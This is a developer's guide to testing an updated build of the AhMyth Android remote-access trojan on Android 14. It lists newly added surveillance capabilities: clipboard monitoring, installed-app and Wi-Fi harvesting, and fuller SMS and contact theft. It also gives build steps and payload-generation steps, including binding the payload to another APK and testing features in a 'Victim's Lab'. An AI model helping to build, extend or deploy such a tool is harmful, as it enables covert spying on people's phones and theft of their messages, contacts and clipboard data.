# Android 14 Testing Guide

## Summary of Changes

### New Features Added:
1. **Device Information** - Comprehensive device details (hardware, OS, memory, storage, battery)
2. **Installed Apps** - List all installed applications with metadata
3. **Clipboard Monitor** - Monitor and retrieve clipboard content
4. **WiFi Information** - Current WiFi connection details and available networks

### Enhanced Features:
1. **File Manager** - Now includes file size, permissions, last modified date
2. **SMS Manager** - Enhanced with sent SMS, timestamps, read status
3. **Contacts** - Added email addresses and additional contact metadata

### Android 14 Compatibility:
- Updated targetSdkVersion to 34 (Android 14)
- Updated compileSdkVersion to 34
- Added POST_NOTIFICATIONS permission
- Added FOREGROUND_SERVICE_DATA_SYNC permission and service type
- Updated template APK to target Android 14

## Testing on Android 14 Emulator

### Prerequisites:
1. Android Studio installed
2. Android SDK Platform 34 (Android 14) installed
3. Android Virtual Device (AVD) with API 34

### Steps:

#### 1. Create Android 14 Emulator
```bash
# Open Android Studio
# Go to Tools > Device Manager
# Click "Create Device"
# Select a device (e.g., Pixel 7)
# Select system image: Android 14.0 (API 34)
# Finish device creation
```

#### 2. Start the Emulator
```bash
# Start the emulator from Android Studio or command line
emulator -avd <your_avd_name>
```

#### 3. Build the AhMyth Server
```bash
cd AhMyth-Server/app
npm install
npm start
```

#### 4. Build the Client APK

**Option A: Using Android Studio**
1. Open `AhMyth-Client` folder in Android Studio
2. Wait for Gradle sync to complete
3. Build > Build Bundle(s) / APK(s) > Build APK(s)
4. Locate the APK in `app/build/outputs/apk/debug/`

**Option B: Using Command Line**
```bash
cd AhMyth-Client
./gradlew assembleDebug
# APK will be in app/build/outputs/apk/debug/app-debug.apk
```

#### 5. Install APK on Emulator
```bash
# Find the IP address of your server machine
# Install the APK on the emulator
adb install app/build/outputs/apk/debug/app-debug.apk

# Or drag and drop the APK into the emulator window
```

#### 6. Configure APK with Server IP
1. When the app launches, grant all required permissions
2. The app will attempt to connect to the server
3. Note: For emulator, use `10.0.2.2` instead of `localhost` or `127.0.0.1`
   - `10.0.2.2` is the special IP that maps to `127.0.0.1` on the host machine

#### 7. Build Payload Using AhMyth Server
1. Open AhMyth Server application
2. Go to APK Builder tab
3. Build a standalone APK or bind to another APK
4. Use `10.0.2.2` as the server IP if testing on emulator
5. Install the generated APK on the emulator

#### 8. Test Features
1. Open the Victim's Lab in AhMyth Server
2. Test each feature:
   - **Device Info**: Should display comprehensive device information
   - **Apps**: Should list all installed applications
   - **Clipboard**: Should monitor clipboard changes
   - **WiFi**: Should show WiFi connection details
   - **File Manager**: Should show enhanced file metadata
   - **SMS**: Should show inbox and sent SMS with timestamps
   - **Contacts**: Should show contacts with email addresses

### Troubleshooting:

**Connection Issues:**
- Ensure server is listening on correct port (default: 42474)
- For emulator, use `10.0.2.2:42474` as server address
- Check firewall settings

**Permission Issues:**
- Android 14 requires runtime permissions for many features
- Grant all permissions when app requests them
- Some features may need to be enabled in device settings

**Build Errors:**
- Ensure Android SDK Platform 34 is installed
- Update build tools to version 34.0.0 or later
- Sync Gradle files in Android Studio

### Expected Behavior on Android 14:
- All features should work with proper permissions
- Foreground service should run without issues
- Notifications should appear correctly
- Location services should function properly

## Notes:
- Android 14 has stricter security policies
- Some permissions require user approval at runtime
- Battery optimization settings may affect background services
- Location services require additional user consent on Android 14


